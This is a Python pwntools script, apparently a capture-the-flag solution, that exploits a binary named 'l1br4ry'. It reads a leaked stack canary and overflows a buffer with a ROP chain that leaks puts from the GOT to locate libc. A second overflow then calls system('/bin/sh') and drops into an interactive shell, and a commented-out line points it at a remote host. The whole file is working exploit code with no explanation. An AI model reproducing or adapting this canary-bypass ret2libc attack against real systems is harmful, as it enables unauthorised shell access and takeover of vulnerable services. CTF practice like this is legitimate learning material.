from pwn import *
context.log_level = 'DEBUG'
elf = ELF("l1br4ry")
context.binary = elf
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("libc.so.6")
#r = remote("gc1.eng.run" , 30302)
r = process("./l1br4ry" )

pop_rdi = p64(0x0000000000401323)
ret = p64(0x000000000040101a)
main = elf.symbols["main"]
puts_plt = elf.plt["puts"]
got_puts = elf.got["puts"]

r.recvuntil("Welcome to the l1br4ry, here is a gift for you: ")
canary = int("0x"+r.recv(16).decode(), 16)
r.recv()
r.write(b"A"*24 + p64(canary) + b"B"*8 + pop_rdi + p64(got_puts) + p64(puts_plt) + p64(main))

puts_offset = int(libc.symbols["puts"])

libc.address = int(unpack(r.recv(6),48)) - puts_offset

print(hex(libc.address))

binsh = int(next(libc.search(b'/bin/sh')))
system = int(libc.symbols["system"])

r.recvuntil("system?\n")
r.write(b"A"*24 + p64(canary) + b"B"*8 + pop_rdi + p64(binsh) + ret + p64(system))
r.interactive()

